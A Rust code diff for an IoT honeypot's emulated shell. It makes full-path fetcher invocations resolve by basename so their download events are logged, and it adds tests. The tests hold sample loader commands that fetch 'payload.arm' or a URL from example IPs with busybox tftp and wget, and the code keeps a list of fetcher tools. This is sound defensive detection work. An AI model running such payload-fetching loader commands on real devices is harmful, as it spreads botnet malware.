@@ -185,7 +185,7 @@ impl FakeShell {
         // `/bin/sh`) - which IoT loaders routinely use - resolves to the same applet a bare invocation
         // would, the way a real shell finds it on PATH. Only the command token is normalised;
         // arguments are untouched.
-        let cmd = parts.first().map(|p| p.rsplit('/').next().unwrap_or(p));
+        let cmd = parts.first().map(|p| command_basename(p));
         match cmd {
             Some("uname") => cmd_uname(parts),
             Some("id") => "uid=0(root) gid=0(root) groups=0(root)\n".to_string(),
@@ -291,12 +291,25 @@ impl FakeShell {
     }
 }
 
+/// The command token with any leading path stripped (`/bin/busybox` -> `busybox`), so a full-path
+/// invocation resolves the way a real shell finds a command on PATH. Shared by [`FakeShell::dispatch`]
+/// and [`download_target`] so they agree on what a command is; without this the two drift and a
+/// full-path fetch answers in-persona while its download evidence is silently dropped.
+fn command_basename(token: &str) -> &str {
+    token.rsplit('/').next().unwrap_or(token)
+}
+
 /// The download target of a fetch command, or `None` if the line is not one. Covers the direct
 /// fetchers and the BusyBox forms (`busybox wget URL`, `busybox tftp ...`) IoT loaders favour, so
 /// the `honeypot_file_download` event fires for those too - not only a bare `wget`/`curl`.
+///
+/// The top-level command token is basename-resolved like `dispatch`, so `/bin/busybox tftp ...` is
+/// captured. The busybox *applet* token is matched raw, exactly like `cmd_busybox`/`is_busybox_applet`
+/// do: real busybox resolves an applet by bare name only, so `busybox /bin/tftp` is "applet not
+/// found" and must not be recorded as a fetch the persona did not answer in character.
 fn download_target<'a>(parts: &[&'a str]) -> Option<&'a str> {
     const FETCHERS: [&str; 4] = ["wget", "curl", "tftp", "ftpget"];
-    match parts.first().copied() {
+    match parts.first().map(|c| command_basename(c)) {
         Some(cmd) if FETCHERS.contains(&cmd) => first_non_flag_arg(&parts[1..]),
         Some("busybox") if parts.get(1).is_some_and(|a| FETCHERS.contains(a)) => {
             first_non_flag_arg(&parts[2..])
@@ -856,6 +869,35 @@ mod shell_detection_tests {
         );
         assert_eq!(download_target(&["busybox", "MIRAI"]), None);
         assert_eq!(download_target(&["ls", "-la"]), None);
+    }
+
+    #[test]
+    fn download_target_captures_full_path_fetch_forms() {
+        // Loaders routinely invoke fetchers by absolute path; `download_target` must resolve the
+        // basename like `dispatch` does, or the `honeypot_file_download` evidence is silently lost
+        // for these while the shell still answers them in-persona. Scheme-less tftp is the case the
+        // `url_if_fetch_line` URL-scheme fallback cannot rescue.
+        assert_eq!(
+            download_target(&[
+                "/bin/busybox",
+                "tftp",
+                "-g",
+                "-r",
+                "payload.arm",
+                "198.51.100.9"
+            ]),
+            Some("payload.arm")
+        );
+        assert_eq!(
+            download_target(&["/usr/bin/wget", "http://198.51.100.9/x"]),
+            Some("http://198.51.100.9/x")
+        );
+        // The busybox APPLET token is matched raw, like cmd_busybox: `busybox /bin/tftp` is
+        // "applet not found" to the persona, so it must not be recorded as a fetch.
+        assert_eq!(
+            download_target(&["busybox", "/bin/tftp", "-g", "-r", "x", "10.0.0.1"]),
+            None
+        );
     }
 
     #[test]
